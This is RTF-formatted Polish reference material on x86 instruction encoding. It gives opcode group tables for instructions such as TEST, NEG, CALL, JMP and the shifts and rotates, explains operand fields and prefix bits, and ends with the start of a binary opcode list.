\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}TEST}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}NOT}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}NEG}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}MUL}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}IMUL}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DIV}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}IDIV}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Op4 - opisuje instrukcje z pierwszym bajtem =FE,}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89beca8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}INC}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DEC}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}\row}{\*\abiendtable}
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Op5 - opisuje instrukcje z pierwszym bajtem =FF.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89c01b0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}INC}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DEC}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL NEAR}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL FAR}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}JMP NEAR}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}JMP FAR}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}PUSH}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}\row}{\*\abiendtable}
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ops - opisuje r\'f3\uc1\u380\'bfne rodzaje przesuni\uc1\u281\'ea\uc1\u263\'e6.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89c21b8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ROL}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ROR}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}RCL}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}RCR}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SHL}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SHR}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SAL}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SAR}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Akumulator - oznacza rejestr AL, AX lub EAX; rodzaj rejestru wybierany jest na podstawie bitu D (je\uc1\u380\'bfeli ten jest w instrukcji) oraz obecno\uc1\u347\'9cci przedrostka 66.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wartkom8 - oznacza bajt okre\uc1\u347\'9claj\uc1\u261\'b9cy liczb\uc1\u281\'ea b\uc1\u281\'ead\uc1\u261\'b9c\uc1\u261\'b9 operandem instrukcji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WartkomD - oznacza bajt, s}{\f0\fs24\lang1045{\*\listtag0}\uc1\u322\'b3owo lub dwus\uc1\u322\'b3owo (zale\uc1\u380\'bfnie od bitu D i przedrostka 66) okre\uc1\u347\'9claj\uc1\u261\'b9ce liczb\uc1\u281\'ea b\uc1\u281\'ead\uc1\u261\'b9c\uc1\u261\'b9 operandem instrukcji.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Reladre8 - okre\uc1\u347\'9cla relatywny offset (z zakresu -128..+127), kt\'f3ry dodawany jest do wska\uc1\u378\'9fnika instrukcji IP po wykonaniu np. skoku lub procedury.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Reladre}{\f0\fs24\lang1045{\*\listtag0}D - okre\uc1\u347\'9cla relatywny offset, kt\'f3ry dodawany jest do wska\uc1\u378\'9fnika instrukcji IP po wykonaniu np: skoku, procedury (rodzaj ofsetu: 16- czy 32- bitowy okre\uc1\u347\'9clany jest na podstawie obecno\uc1\u347\'9cci przedrostka 66).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Numport8 - okre\uc1\u347\'9cla numer portu (8 bit\'f3w), na kt\'f3rym wykonuje si\uc1\u281\'ea operacj\uc1\u281\'ea IN lub OUT.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Addroffs i Addrsegm - okre\uc1\u347\'9claj\uc1\u261\'b9 segment i offset, pod kt\'f3ry skacze procesor po wykonaniu dalekiej procedury lub dalekiego skoku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit D - okre\uc1\u347\'9cla rodzaj operandu: bajt, s\uc1\u322\'b3owo lub dwus\uc1\u322\'b3owo;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - je\uc1\u380\'bfeli nie wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek 66 }{\f1\fs24\lang1045{\*\listtag0}i D=0: bajt,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - je\uc1\u380\'bfeli nie wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek 66 i D=1: s\uc1\u322\'b3owo,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch - je\uc1\u380\'bfeli wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek 66 i D=1: podw\'f3jne s\uc1\u322\'b3owo.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit S - okre\uc1\u347\'9cla kierunek przesy\uc1\u322\'b3ania danych podczas wykonywania instrukcji zawieraj\uc1\u261\'b9cych bajt MmRejMem; S=0 Operacja Mem, Rej i S=1 Oper}{\f1\fs24\lang1045{\*\listtag0}acja Rej, Mem.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bit F - ustawiony, oznacza, i\uc1\u380\'bf jest to RETF, w przeciwnym razie RETN.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Je\uc1\u380\'bfeli mnemonik instrukcji zmienia si\uc1\u281\'ea przy u\uc1\u380\'bfyciu przedrostka 66 lub bitu D, kolejne nazwy s\uc1\u261\'b9 oddzielone przecinkiem.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Kody Instrukcji}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod instrukcji (binarnie)                   Mnemonik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 1000Wwww Reladr16           JWwww Reladr16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 1001Wwww MmRejMem           SETWwww byte ptr [Mem]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00001111 10100000                    PUSH FS}{\f2\fs24\lang1045{\*\listtag0}\par}
